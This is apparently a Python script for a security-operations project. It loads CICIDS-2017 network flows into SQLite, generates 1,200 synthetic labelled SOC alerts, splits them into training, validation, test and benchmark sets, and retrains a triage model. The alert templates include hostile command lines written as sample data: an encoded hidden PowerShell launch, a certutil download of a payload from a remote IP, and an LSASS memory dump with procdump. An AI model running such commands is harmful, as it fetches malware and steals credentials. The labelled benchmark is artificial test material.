"""Ingest real CICIDS-2017 from HuggingFace and generate high-entropy, realistic SOC alerts.

1. Ingests real flows from 'bvk/CICIDS-2017' into soc_telemetry.db.
2. Expands alert corpus to 1,200 incidents with high linguistic variance,
   obfuscated living-off-the-land binaries, dual-use tools, and ambiguous false positives.
3. Updates train/val/test splits and golden benchmark.
4. Retrains System 1 decision model.
"""

import ipaddress
import json
import random
import sqlite3
import sys
from pathlib import Path
from datasets import load_dataset

PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

DB_PATH = PROJECT_ROOT / "locals" / "data" / "soc_telemetry.db"
DATA_DIR = PROJECT_ROOT / "locals" / "data"
BENCHMARK_DIR = PROJECT_ROOT / "locals" / "benchmarks"
FINETUNE_DIR = PROJECT_ROOT / "locals" / "finetune"

DATA_DIR.mkdir(parents=True, exist_ok=True)
BENCHMARK_DIR.mkdir(parents=True, exist_ok=True)
FINETUNE_DIR.mkdir(parents=True, exist_ok=True)


def int_to_ipv4(dec_ip: int) -> str:
    """Convert integer IP format from CICIDS to dotted-decimal IPv4 string."""
    try:
        return str(ipaddress.IPv4Address(int(dec_ip)))
    except Exception:
        return f"192.168.10.{random.randint(1, 254)}"


def ingest_cicids_2017(max_samples: int = 3000):
    """Stream real flows from bvk/CICIDS-2017 into sqlite database."""
    print(f"Streaming {max_samples} real flows from bvk/CICIDS-2017 on Hugging Face...")
    ds = load_dataset("bvk/CICIDS-2017", split="train", streaming=True)
    
    conn = sqlite3.connect(DB_PATH)
    records = []
    
    for i, row in enumerate(ds):
        if i >= max_samples:
            break
        src_ip = int_to_ipv4(row.get("Src IP dec", 0))
        dst_ip = int_to_ipv4(row.get("Dst IP dec", 0))
        src_port = int(row.get("Src Port", 1024 + (i % 60000)))
        dst_port = int(row.get("Dst Port", 80))
        proto = "tcp" if int(row.get("Protocol", 6)) == 6 else "udp"
        bytes_sent = int(row.get("Total Length of Fwd Packet", 120))
        bytes_recv = int(row.get("Total Length of Bwd Packet", 240))
        lbl = str(row.get("Label", "BENIGN"))
        
        attack_cat = "Normal" if lbl.upper() == "BENIGN" else lbl
        label_int = 0 if lbl.upper() == "BENIGN" else 1

        records.append((
            f"2026-11-20T{11 + (i // 3600):02d}:{(i // 60) % 60:02d}:{i % 60:02d}Z",
            src_ip,
            src_port,
            dst_ip,
            dst_port,
            proto,
            bytes_sent,
            bytes_recv,
            attack_cat,
            label_int,
            "huggingface:bvk/CICIDS-2017",
        ))

    conn.executemany("""
        INSERT INTO network_flows (timestamp, src_ip, src_port, dst_ip, dst_port, protocol, bytes_sent, bytes_received, attack_cat, label, dataset_source)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, records)
    conn.commit()
    
    cur = conn.cursor()
    total_flows = cur.execute("SELECT COUNT(*) FROM network_flows").fetchone()[0]
    conn.close()
    print(f"Successfully ingested CICIDS-2017! Total flows in database: {total_flows}")


def generate_high_entropy_corpus(total: int = 1200):
    """Generate diverse, high-entropy SOC alerts with obfuscation, LOLBins, and ambiguous edge cases."""
    print(f"Generating {total} high-variance SOC alerts...")
    
    scenarios = [
        # (category, classification, severity, event_type, desc_templates, mitre)
        (
            "brute_force",
            "likely_true_positive",
            "high",
            "authentication_failure",
            [
                "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={src_ip} user={user}",
                "EventID: 4625 (Logon Failure) SubStatus: 0xC000006A (Bad Password). Account: {user} from Workstation: {src_ip} threshold exceeded.",
                "Multiple Kerberos pre-authentication errors (KRB_AP_ERR_BAD_INTEGRITY) targeting principal {user}@{domain} followed by TGT grant.",
                "SSH-2.0-OpenSSH_8.9p1 connection flood: {failed_attempts} failed auth attempts against {host} port 22 from {src_ip}.",
            ],
            "T1110",
        ),
        (
            "port_scan",
            "likely_true_positive",
            "medium",
            "network_recon",
            [
                "Firewall DROP: Inbound SYN burst {src_ip} -> {dst_ip} ports [{ports_str}]. Flow rate > 120 pkts/sec.",
                "Snort Alert [1:2001219:15] ET SCAN Potential NMAP OS Detection Probe originating from {src_ip}.",
                "Perimeter edge ACL violation: TCP stealth scan across {ports_cnt} sequential ports on DMZ subnet.",
            ],
            "T1046",
        ),
        (
            "living_off_the_land_malware",
            "likely_true_positive",
            "critical",
            "edr_process_anomaly",
            [
                "Sysmon Event 1: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi... spawned by wmic.exe on {host}.",
                "Process certutil.exe spawned with arguments '-urlcache -split -f http://{dst_ip}/payload.bin C:\\Windows\\Temp\\update.exe'.",
                "Subversion: rundll32.exe executing exported DLL function from AppData\\Roaming\\{file_name} under user {user}.",
                "LSASS handle injection detected: procdump.exe -ma lsass.exe lsass.dmp invoked by {user} on domain controller {host}.",
            ],
            "T1059",
        ),
        (
            "suspicious_c2_outbound",
            "likely_true_positive",
            "high",
            "network_egress",
            [
                "Zeek conn.log: Periodic beaconing detected {src_ip} -> {dst_ip}:443 jitter=2.3s interval=60s byte_ratio=0.98.",
                "Suricata ALERT: ET MALWARE Cobalt Strike Malleable C2 HTTP POST to unassigned cloud IP {dst_ip}.",
                "Large data exfiltration anomaly: 2.4 GB outbound stream over port 8443 to dynamic DNS host {dst_ip} during off-hours.",
            ],
            "T1071",
        ),
        (
            "ambiguous_admin_false_positive",
            "likely_false_positive",
            "low",
            "scheduled_maintenance",
            [
                "Ansible automation controller {src_ip} executing root maintenance playbook on cluster host {host}.",
                "Nessus Vulnerability Scanner (Asset ID: VULN-SCAN-01, IP: {src_ip}) running scheduled PCI-DSS compliance sweep.",
                "Backup agent Veeam transferring snapshot archive (3.8 GB) to disaster recovery target {dst_ip}.",
                "SCCM configuration manager pushing monthly KB5034441 cumulative security rollup to {host}.",
            ],
            "N/A",
        ),
        (
            "ambiguous_user_lockout",
            "likely_false_positive",
            "low",
            "authentication_failure",
            [
                "User {user} active directory account locked out. Cached credentials on mobile device iPhone-14 repeatedly polling Exchange ActiveSync.",
                "Workstation screensaver unlock attempt failed 2 times: user entered previous password following required 90-day rotation.",
                "Service account {user} failed auth: expired service principle certificate on IIS web farm.",
            ],
            "N/A",
        ),
        (
            "insufficient_evidence_anomaly",
            "needs_investigation",
            "medium",
            "heuristic_anomaly",
            [
                "Uncharacteristic off-hours RDP session initiated by {user} from residential VPN IP {src_ip} at 03:14 AM.",
                "DNS query burst for high-entropy domain string '{file_name}.tunnel.org' from endpoint {host}.",
                "New parent-child relationship: explorer.exe -> powershell.exe -> git.exe on workstation {host}.",
            ],
            "T1078",
        ),
    ]

    users = ["alice.smith", "bob.jenkins", "charlie.admin", "svc_backup", "svc_sql", "dev_deployer", "m.ross", "j.watson"]
    hosts = ["dc-01.corp", "db-prod-02", "app-web-01", "ws-hr-104", "ws-eng-402", "fw-edge-01", "jumpbox-01", "k8s-worker-03"]
    src_ips = ["185.220.101.5", "45.142.214.10", "194.26.29.112", "10.0.10.45", "192.168.1.15", "103.208.220.5", "172.16.50.4"]
    dst_ips = ["10.0.0.5", "10.0.0.12", "192.168.50.2", "172.16.1.100", "104.244.42.1", "185.199.108.153", "52.216.14.8"]
    files = ["update.vbs", "invoice_scan.pdf.exe", "svchost32.exe", "libssl_hook.dll", "payload.bin"]
    hashes = [
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "8754b2b075e7f9a888c3de77ed215888e2cae5cb2cfdcaaaec1324747ebc79a9",
        "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
        "3a9f7d54b2a8848d7920703f26033bbca818961726a2e22c95b682ec09c62921",
    ]

    alerts = []
    random.seed(999)

    for i in range(total):
        cat, classification, severity, event_type, templates, mitre = random.choice(scenarios)
        user = random.choice(users)
        host = random.choice(hosts)
        src_ip = random.choice(src_ips)
        dst_ip = random.choice(dst_ips)
        file_name = random.choice(files)
        h = random.choice(hashes)
        failed_cnt = random.randint(6, 40) if "brute" in cat else (random.randint(1, 3) if "user" in cat else 0)
        ports_cnt = random.randint(12, 150)
        ports_sample = ", ".join(str(random.randint(20, 8080)) for _ in range(4))

        template = random.choice(templates)
        desc = template.format(
            user=user,
            host=host,
            src_ip=src_ip,
            dst_ip=dst_ip,
            domain="CORP.LOCAL",
            failed_attempts=failed_cnt,
            ports_str=ports_sample,
            ports_cnt=ports_cnt,
            file_name=file_name,
        )

        metadata = {
            "ground_truth_category": cat,
            "ground_truth_classification": classification,
            "ground_truth_severity": severity,
            "mitre_technique": mitre,
            "login_success_after_failures": True if (cat == "brute_force" and random.random() > 0.5) else False,
            "approved_activity": True if "admin" in cat else False,
            "sha256": h if "malware" in cat else None,
        }

        alerts.append({
            "alert_id": f"AL-EXP-{i+1:05d}",
            "timestamp": f"2026-11-{random.randint(1, 20):02d}T{random.randint(0, 23):02d}:{random.randint(0, 59):02d}:00Z",
            "source_ip": src_ip,
            "destination_ip": dst_ip,
            "user": user,
            "host": host,
            "event_type": event_type,
            "description": desc,
            "failed_attempts": failed_cnt,
            "metadata": metadata,
        })

    # Shuffle
    random.shuffle(alerts)

    # 70% Train, 15% Val, 15% Test
    n = len(alerts)
    train_end = int(n * 0.70)
    val_end = int(n * 0.85)

    train_set = alerts[:train_end]
    val_set = alerts[train_end:val_end]
    test_set = alerts[val_end:]

    # 50-incident diverse Golden Benchmark with hard ambiguous cases
    golden_benchmark = []
    cats = sorted(set(a["metadata"]["ground_truth_category"] for a in alerts))
    for c in cats:
        matching = [a for a in test_set if a["metadata"]["ground_truth_category"] == c]
        golden_benchmark.extend(matching[:7])

    with open(DATA_DIR / "soc_alerts_train.json", "w", encoding="utf-8") as f:
        json.dump(train_set, f, indent=2)
    with open(DATA_DIR / "soc_alerts_val.json", "w", encoding="utf-8") as f:
        json.dump(val_set, f, indent=2)
    with open(DATA_DIR / "soc_alerts_test.json", "w", encoding="utf-8") as f:
        json.dump(test_set, f, indent=2)
    with open(BENCHMARK_DIR / "golden_soc_benchmark.json", "w", encoding="utf-8") as f:
        json.dump(golden_benchmark, f, indent=2)

    print(f"Updated datasets:")
    print(f"  - Train: {len(train_set)}")
    print(f"  - Validation: {len(val_set)}")
    print(f"  - Test: {len(test_set)}")
    print(f"  - Golden Benchmark: {len(golden_benchmark)} samples")


def retrain_system1():
    """Retrain System 1 model on the high-entropy corpus."""
    from backend.agents.system1_decision import system1_model
    print("Retraining System 1 Decision Model on expanded corpus...")
    res = system1_model.train_on_corpus(str(DATA_DIR / "soc_alerts_train.json"))
    print("Retraining result:", res)


if __name__ == "__main__":
    ingest_cicids_2017(max_samples=3000)
    generate_high_entropy_corpus(total=1200)
    retrain_system1()
